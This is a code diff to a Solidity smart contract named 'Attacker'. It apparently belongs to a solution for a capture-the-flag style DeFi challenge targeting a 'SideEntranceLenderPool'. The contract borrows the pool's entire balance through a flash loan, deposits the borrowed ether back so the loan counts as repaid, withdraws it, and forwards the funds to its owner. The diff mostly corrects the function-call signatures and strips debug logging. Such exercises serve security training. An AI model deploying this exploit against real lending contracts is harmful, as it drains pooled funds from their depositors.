@@ -3,29 +3,29 @@ pragma solidity ^0.8.3;
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "hardhat/console.sol";
-import "./SideEntranceLenderPool.sol";
 
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
 
 contract Attacker is IFlashLoanEtherReceiver, Ownable {
-    using Address for address payable;
+    using Address for address;
     address lenderPool;
     constructor(address pool) Ownable() {
         lenderPool = pool;
-        console.log(" owner is %s", owner());
     }
 
     function execute() external payable override {
-        lenderPool.call{value: address(this).balance}(abi.encodeWithSignature("function deposit()"));
+        lenderPool.functionCallWithValue(abi.encodeWithSignature("deposit()"), address(this).balance);
     }
 
     function start() public onlyOwner {
-        lenderPool.call{value: 0}(abi.encodeWithSignature("flashLoan(uint256 amount)", address(lenderPool).balance));
-        lenderPool.call{value: 0}(abi.encodeWithSignature("withdraw()"));
+        lenderPool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", address(lenderPool).balance));
+        lenderPool.functionCall(abi.encodeWithSignature("withdraw()"));
     }
 
     receive () external payable {
-        console.log(address(this));
-        console.log(address(this).balance);
-        payable(owner()).sendValue(address(this).balance);
+        payable(owner()).transfer(address(this).balance);
+//        payable(owner()).call{value: address(this).balance}("");
     }
 }
